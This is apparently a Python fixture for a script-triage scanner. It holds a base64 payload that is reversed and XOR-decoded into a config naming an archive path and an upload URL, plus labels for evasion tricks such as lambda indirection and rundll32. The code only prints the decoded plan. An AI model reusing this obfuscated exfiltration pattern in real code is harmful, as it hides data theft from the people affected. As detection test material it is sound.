#!/usr/bin/env python3

# Huntress Script Triage -- inert static-analysis fixture (cpython3)

import base64

import io

import os



MATERIAL_9e597fc6 = "EgsYTFYAVAYAUlIGAFFPBwoBAwFNAAMuEREHEBYMFypNAxYDJg8DEAUNEDJNWCFfChYDEj0HFAsKARADHgYDDQ4SF00GCw4DFAwLTAcOEg8DGgdMVgBUBgBSUgYAUU1NWBESFhYKXw4QFz0GAw0OEhceVgBUBgBSUgYAUU8MBQsDEg8DAV8GCz0MBQsDEg8DAR4QDRERBwEHBgcQEj1QUQ4OBgwXEF8MCwMKAT0RFQ0GDAsVHhALBgcMDT0QBw4OAxYRDAsbEl8QBwsQEAMBHgwNCxYBBxALBgwLPQMGAA8DDl8MDQsWAwERFwQADR4KARYDEhELBj0bEAMMDQsWAQsGXxoDFgwbER5TXxYMFw0BPQcFAxYRHgwDDhI9DxANBD0WEAMSCxYOFw9fEAcWEgMGAx4HFg0PBxA9FgsPEQwDEBZOBxQLCgEQAz0HBg0BDAdODgMBDQ49FgEHDg4NAV8REgcWER5QXxQ="

CODEC_9e597fc6 = "base64_literal|reverse_then_xor|62"



def load_9e597fc6():

    return base64.b64decode(MATERIAL_9e597fc6)



def decode_9e597fc6(e):

    return bytes(value ^ 98 for value in reversed(e))



def recover_9e597fc6():

    n = (3, 5, 8, 13)[1:3]

    d = decode_9e597fc6(load_9e597fc6())

    t = d.decode("ascii", "strict")

    return t



def inspect_9e597fc6():

    view = memoryview(recover_9e597fc6().encode("ascii"))

    return bytes(view).decode("ascii")



def surface_9e597fc6():

    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}

    return routes["selected"]()



def obfuscation_9e597fc6():

    recover = lambda value: value

    return recover("lambda_indirection")



def plan_9e597fc6():

    fields = dict(item.split("=", 1) for item in inspect_9e597fc6().split("|"))

    analysis_surface = surface_9e597fc6()

    obfuscation_surface = obfuscation_9e597fc6()

    operation_plan = ("multipart_form_plan", fields["archive_path"], fields["upload_url"])

    return operation_plan + (analysis_surface, obfuscation_surface)



if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":

    print(inspect_9e597fc6())

